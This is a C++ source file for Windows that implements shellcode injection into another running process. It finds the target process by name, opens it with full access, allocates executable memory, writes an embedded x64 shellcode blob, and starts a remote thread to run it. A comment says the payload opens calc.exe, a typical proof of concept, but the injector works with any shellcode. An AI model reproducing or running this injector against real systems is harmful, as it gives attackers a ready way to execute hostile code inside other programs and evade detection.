#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <string>

void inject(int pid) {
    // Try to open calc.exe
    unsigned char shellcode[] = 
        "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
        "\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
        "\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
        "\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
        "\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
        "\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
        "\x48\x83\xec\x20\x41\xff\xd6";

    HANDLE pidproc;
    PVOID memaddr;
    BOOL writescmem;
    SIZE_T written;
    HANDLE thrd;

    pidproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (pidproc) {
        printf("[+] PID opened\n");
    }
    else {
        printf("[-] PID not found\n");
        exit(1);
    }

    memaddr = VirtualAllocEx(pidproc, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (memaddr) {
        printf("[+] Allocated virtual memory: 0x%08x\n", memaddr);
    }

    writescmem = WriteProcessMemory(pidproc, memaddr, shellcode, sizeof(shellcode), &written);
    if (writescmem) {
        printf("[+] Shellcode written to memory\n");
    }

    thrd = CreateRemoteThread(pidproc, NULL, 0, (LPTHREAD_START_ROUTINE)memaddr, NULL, 0x0, NULL);
    if (thrd) {
        printf("[+] Shellcode executed!\n");
    }
    CloseHandle(pidproc);
}

void help(const std::string& programName) {
    printf("usage: %s ProcessName\n", programName.c_str());
}

int GetProcessIdByName(const std::wstring& processName) {
    int processId = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 processEntry;
        processEntry.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(hSnapshot, &processEntry)) {
            do {
                std::wstring entryName(processEntry.szExeFile);

                if (_wcsicmp(entryName.c_str(), processName.c_str()) == 0) {
                    processId = static_cast<int>(processEntry.th32ProcessID);
                    break;
                }
            } while (Process32Next(hSnapshot, &processEntry));
        }

        CloseHandle(hSnapshot);
    }

    return processId;
}

int main(int argc, char* argv[]) {
    if (argv[1] == NULL) {
        std::string fullPath(argv[0]);
        size_t lastSlashPos = fullPath.find_last_of("/\\");

        std::string programName;

        if (lastSlashPos != std::string::npos) {
            programName = fullPath.substr(lastSlashPos + 1);
        }
        else {
            programName = fullPath;
        }
        help(programName);
        return 0;
    }

    std::wstring targetProcessName = std::wstring(argv[1], argv[1] + strlen(argv[1]));
    int pid = GetProcessIdByName(targetProcessName);

    inject(pid);
}